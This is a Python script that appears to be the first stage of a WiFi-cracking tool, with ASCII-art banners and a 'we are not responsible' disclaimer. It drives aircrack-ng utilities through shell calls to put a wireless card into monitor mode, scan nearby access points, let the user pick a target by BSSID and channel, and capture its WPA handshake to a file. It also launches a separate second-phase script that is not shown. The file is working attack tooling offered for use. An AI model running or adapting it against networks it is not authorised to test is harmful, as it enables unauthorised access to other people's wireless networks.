#Modules

import os
import time
import csv
from prettytable import PrettyTable
from colorama import Fore, Back, Style



#Global Variables

path = os.path.dirname(os.path.abspath(__file__))
aplist = []
l=list()
fdata=list()
wifidev = ""
pskfile = ""


#Functions

temppth111 = path + "/tempwifihacktdkrt-01.csv"
if os.path.isfile (temppth111) == True:
	os.remove(temppth111)
	


temppth112 = path + "/tempwifihacktdkrt-01.log.csv"
if os.path.isfile (temppth112) == True:
	os.remove(temppth112)



temppth113 = path + "/tempwifihacktdkrt-01.kismet.csv"
if os.path.isfile (temppth113) == True:
	os.remove(temppth113)
	


temppth114 = path + "/tempwifihacktdkrt-01.kismet.netxml"
if os.path.isfile (temppth114) == True:
	os.remove(temppth114)
	


temppth115 = path + "/tempwifihacktdkrt-01.cap"
if os.path.isfile (temppth115) == True:
	os.remove(temppth115)
	


temppth116 = path + "/tempwifihacktdkrttxt.txt"
if os.path.isfile (temppth116) == True:
	os.remove(temppth116)







def home():
	os.system("clear")
	print(Fore.RED + '''                                                                                                    
                                                                                                    
                                                                      =*                            
                                            .:-===+++===-.         .=#%#                            
                                       :=+#%################*****#%%%%%=                            
                                     =#############################%%%=                             
                                   =##################%%%%%%%%%%%%%%%#==-.                          
                                  +%######################################%*=                       
                                 :%######%%####%%%%%%%%%%####################%+                     
                                 =%######%%##%%%%%%%%%%%%%%%%###########%%%%%%%#:                   
                                 =%#####%%%%%%%%%%%%%%%%%%%%%%%%%#########%%%%%%%-                  
                                 :%%#####%%%%%%%%%%%%%%%%%%%%%%%%##########%%%%%%%:                 
                                  *%#####%%%%%%%%*==+#%%%%%%%%%%%###########%%%*#%*                 
                                  .#%#####****#%:     :*%%%%%%%%%%%%##########%#:+%:                
                                   =%*****+===#*        -%%%%%%%%%%%%##########%%:=+                
                                   .%####%###*#+         :%%%%%%%%%%%%##########%%.=                
                                 .-+%%#=: :-+#%%*-.       :%%%%%%%%%%%###########%*             .:  
                              :=*%%*-.    ::::-=*%%#=:     -%%%%%%%%%%%##########%%*:         :+*   
                          .-+#%#+:        ::::::::=+#%%*-.  -%%%%%%%%%%%%##########%%#+-:::-+#%*    
                       :=#%%*-.           :::::::::::-+*%%#=:.*%%%%%%%%%%%######%#######%%%%%%+     
                      .%%+-               :::::::::::::::=*%%- -#%%%%%%%%%%%%######%%%%%%%%%#:      
                      .%%                 :::::::::::::::::#%-   -+%%%%%%%%%%%%%%%###%%%%%*-        
                      .%%                 :::::::::::::::::#%-      :=*%%%%%%%%%%%%%%%#+-           
                      .%%                 :::::::::::::::::#%-          .:-=======-:.               
                      .%%                 :::::::::::::-:::#%-                                      
                      .%%   .#%#*+=-:.    ::::--=+**#%%-:::#%-                                      
                      .%%    -%%%%%%%%%#  ::#%%%%%%%%%+::::#%-                                      
                      .%%     .=*%%%%%%%# :#%%%%%%%#+-:::::#%-                                      
                      .%%         -+#%%%%**%%%%%*=-::::::::#%-                                      
                      .%%            :+%%%%%%*=::::::::::::#%-                                      
                      .%%             :%%%%%%=:::::::::::::#%-                                      
                     -+%%              %%%%%%-:::::::::::::#%*-.                                    
                 .=*%%##%.             %%%%%%:::::::::::::-%#%%%*=:                                 
              :+#%%#****##.            *%%%%#::::::::::::-#######%%#+:                              
          .-*%%%#*#******##:           +%%%%#:::::::::::-#########*#%%%*=.                          
          :%%%-.  .#******#%-          =%%%%*::::::::::=%########=::-=%%%-                          
           +%%-    -#*******%+         -%%%%+:::::::::*%########+::::=%%*                           
         :=#%%#.    =#*******#%=       :%%%%+:::::::+##########*::::-#%%#+:                         
     .-*%%%++%%#.    -#********##=.    .%%%%=::::-+#%#########*::::-#%%**#%%*=:                     
  .+#%%#=:   .+%%-    :#*********#%+:   %%%%-::-*%###########+::::-#%*=:::=+#%%#+:                  
   #%%*        .=#=    .#**********###=.%%%%-+#%############=::::+%*-::::::::+%%#.                  
   .#%%:          -=.   .*************##%%%%%##############-:::-+=-:::::::::-%%#.                   
    .#%#.   .-            -##+=-=#*******##########*=++#%+::::::::::::==:::-#%%:                    
     .#%%:  -%-            .*-   -#********#######+:::=#=::::::::::::=%*::-#%#:                     
      .#%%= -%%=             --   .#*******######=:::=+:::::::::::::=%%*:+%%#:                      
        *%%#+%%%*.             :    *******#####-:::=-:::::::::::::*%%%*#%%#.                       
         +%%%%%%%#-                  =#****###*::::::::::::::::::=#%%%%%%%*                         
          -%%%%%%%%#-     :           .*#*###=:::::::::::=:::::=#%%%%%%%%=                          
           .*%%%%#%%%#=  .%*            =#%+::::::::::::+%-::=#%%%#%%%%#:                           
             -#%%.=%%%%%++%%*.            -:::::::::::-*%%**%%%%%= #%#-                             
               -#  .*%%%%%%%%#:           :::::::::::-#%%%%%%%%#:  *=                               
                     -#%%%%%%%%=          ::::::::::+%%%%%%%%#=                                     
                       :*%%%#%%%#:        ::::::::=#%%%#%%%*-                                       
                          -+. =#%%*:      ::::::-*%%%+. +-.                                         
                                =#%%*-    ::::=*%%%=.                                               
                                  =%%%#=. :-+#%%%=                                                  
                                    =#%%%##%%%%=                                                    
                                      =#%%%%#=                                                      
                                        -##=                                                        \n\n''')
	time.sleep(1)
                                        
	print('''
█▀▀██▀▀█ ▀██                 ▀██▀▀█▄                   ▀██         ▀██▀  █▀            ██          ▀██        ▄   
   ██     ██ ▄▄     ▄▄▄▄      ██   ██   ▄▄▄▄   ▄▄▄ ▄▄   ██  ▄▄      ██ ▄▀    ▄▄ ▄▄▄   ▄▄▄    ▄▄▄ ▄  ██ ▄▄   ▄██▄  
   ██     ██▀ ██  ▄█▄▄▄██     ██    ██ ▀▀ ▄██   ██▀ ▀▀  ██ ▄▀       ██▀█▄     ██  ██   ██   ██ ██   ██▀ ██   ██   
   ██     ██  ██  ██          ██    ██ ▄█▀ ██   ██      ██▀█▄       ██  ██    ██  ██   ██    █▀▀    ██  ██   ██   
  ▄██▄   ▄██▄ ██▄  ▀█▄▄▄▀    ▄██▄▄▄█▀  ▀█▄▄▀█▀ ▄██▄    ▄██▄ ██▄    ▄██▄  ██▄ ▄██▄ ██▄ ▄██▄  ▀████▄ ▄██▄ ██▄  ▀█▄▀ 
                                                                                           ▄█▄▄▄▄▀                
                                                                                                                  \n''')
	time.sleep(1)
	print(Fore.GREEN + ''' █   █ █ ▀█▀ █▄█
 ▀▄▀▄▀ █  █  █ █
''')
	time.sleep(1)
	print(Fore.RED + '''
▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
██ ▄▄▀█▄▄ ▄▄████ ████ ▄▄▀█ ▄▄█ ███ █ ▄▄█ ██▀▄▄▀█▀▄▄▀█ ▄▄█ ▄▄▀█ ▄▄██
██ ▀▀▄███ ██████ ████ ██ █ ▄▄██ ▀ ██ ▄▄█ ██ ██ █ ▀▀ █ ▄▄█ ▀▀▄█▄▄▀██
██ ██ ███ ██████ ████ ▀▀ █▄▄▄███▄███▄▄▄█▄▄██▄▄██ ████▄▄▄█▄█▄▄█▄▄▄██
▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
''')
	time.sleep(1)
	os.system("clear")
	print(Fore.RED + "     _     "+Fore.YELLOW+" _  "+Fore.CYAN+"       "+Fore.RED+" ____   "+Fore.YELLOW+"       "+Fore.CYAN+"        "+Fore.BLUE+"  _     "+Fore.MAGENTA+" _  "+Fore.WHITE+"       ")
	print(Fore.RED + "    / \    "+Fore.YELLOW+"(_) "+Fore.CYAN+" _ __  "+Fore.RED+"|  _ \  "+Fore.YELLOW+"  ___  "+Fore.CYAN+"   ___  "+Fore.BLUE+" | | __ "+Fore.MAGENTA+"(_) "+Fore.WHITE+"  ___  ")
	print(Fore.RED + "   / _ \   "+Fore.YELLOW+"| | "+Fore.CYAN+"| '__| "+Fore.RED+"| |_) | "+Fore.YELLOW+" / _ \ "+Fore.CYAN+"  / _ \ "+Fore.BLUE+" | |/ / "+Fore.MAGENTA+"| | "+Fore.WHITE+" / _ \ ")
	print(Fore.RED + "  / ___ \  "+Fore.YELLOW+"| | "+Fore.CYAN+"| |    "+Fore.RED+"|  _ <  "+Fore.YELLOW+"| (_) |"+Fore.CYAN+" | (_) |"+Fore.BLUE+" |   <  "+Fore.MAGENTA+"| | "+Fore.WHITE+"|  __/ "+Fore.GREEN + "  █   █ █ █▀ █")
	print(Fore.RED + " /_/   \_\ "+Fore.YELLOW+"|_| "+Fore.CYAN+"|_|    "+Fore.RED+"|_| \_\ "+Fore.YELLOW+" \___/ "+Fore.CYAN+"  \___/ "+Fore.BLUE+" |_|\_\ "+Fore.MAGENTA+"|_| "+Fore.WHITE+" \___| "+Fore.GREEN + "  ▀▄▀▄▀ █ █▀ █")
	print(Fore.RED + '''
 ______________________________________________________________ 
|  __________________________________________________________  |
| |							     | |
| | We are not responsible for what you do with this script. | |
| |__________________________________________________________| |
|______________________________________________________________|\n\n''')
	strtch = input(Fore.RED + "Continue? (y/n): ")
	if strtch == "y":
		os.system("clear")
		start()
	else:
		print("Exiting...")
	
def start():

	global wifidev
	
	os.system("sudo airmon-ng")
	
	wifidev = input("Enter your WiFi Interface carefully: ")
	cmd = "sudo airmon-ng start " + wifidev
	os.system(cmd)
	scan()
	
def scan():
	global wifidev
	global path
	c = input(Fore.RED + "Press 'Ctrl + C' to exit scanning, continue? (y/n):")
	if c == "y":
		
		cmd = "sudo airodump-ng "+ wifidev +"mon -w " + path + "/tempwifihacktdkrt"
		os.system(cmd)
		selectAP()
	elif c == "n":
		print("Exiting...")
	else:
		scan()
		
def selectAP():
	global path
	global aplist
	global l
	global fdata
	
	n=0
	filename = path + "/tempwifihacktdkrt-01.csv"
	
	f = open(filename, 'r')
	reader = csv.reader(f)
	next(reader)
	next(reader)
	
	tbl = PrettyTable()
	tbl.field_names = ['S. No.', 'BSSID', 'Channel', 'ESSID', 'Power']
	for row in reader:
		if len(row) == 15:
			aplist.append(row)
	for i in aplist:
		n+=1
		l.append([n,i[0], i[3], i[13], i[8]])
		tbl.add_row([n,i[0], i[3], i[13], i[8]])
	print(tbl)
	
	apch=int(input("\nEnter the S. No. of AP: "))
	
	for q in l:
		
		if apch == q[0]:
			fap = q
			break
			
	for ii in aplist:
		if fap[1] == ii[0]:
			fdata = ii
			break
			
	print(fdata)
	f.close()
	
	os.remove(path + "/tempwifihacktdkrt-01.csv")
	os.remove(path + "/tempwifihacktdkrt-01.log.csv")
	os.remove(path + "/tempwifihacktdkrt-01.kismet.csv")
	os.remove(path + "/tempwifihacktdkrt-01.kismet.netxml")
	os.remove(path + "/tempwifihacktdkrt-01.cap")
	pskfilenm()
	
	
def pskfilenm():
	global pskfile
	
	pskfile = input("Enter Handshake file name: ")
	grbgvar=os.getlogin()
	svflnmgrbg = "/home/" + grbgvar + "/" + pskfile + "-01.cap"
	if os.path.isfile (svflnmgrbg) == True:
		print(Fore.RED + "A file with the following name already exist, choose another name.")
		pskfilenm()
	else:
		apdevicescan()
	
def apdevicescan():
	global fdata
	global path
	global wifidev
	global pskfile
	
	qwert = path + "/tempwifihacktdkrttxt.txt"
	tmpfiletxt = open(qwert,"a")
	tmpfiletxt.write(pskfile + " " + wifidev)
	tmpfiletxt.close()
	
	cmd = "sudo airodump-ng -c " + str(fdata[3]) + " --bssid " + str(fdata[0]) + " -w  " +pskfile+ " " +wifidev+ "mon"  
	
	cmd1 = 'gnome-terminal --geometry 105x25 -x bash -c "python3 ' + path + '/secondphase.py; exec bash"'
	
	print(cmd1)
	os.system(cmd1)
	os.system(cmd)
	xmd = "sudo airmon-ng stop " + wifidev + "mon"
	os.system(xmd)
	print("Exiting...")

	
	temppth111 = path + "/tempwifihacktdkrt-01.csv"
	if os.path.isfile (temppth111) == True:
		os.remove(temppth111)
	
	temppth112 = path + "/tempwifihacktdkrt-01.log.csv"
	if os.path.isfile (temppth112) == True:
		os.remove(temppth112)

	temppth113 = path + "/tempwifihacktdkrt-01.kismet.csv"
	if os.path.isfile (temppth113) == True:
		os.remove(temppth113)

	temppth114 = path + "/tempwifihacktdkrt-01.kismet.netxml"
	if os.path.isfile (temppth114) == True:
		os.remove(temppth114)

	temppth115 = path + "/tempwifihacktdkrt-01.cap"
	if os.path.isfile (temppth115) == True:
		os.remove(temppth115)
	
	temppth116 = path + "/tempwifihacktdkrttxt.txt"
	if os.path.isfile (temppth116) == True:
		os.remove(temppth116)


#Call
home()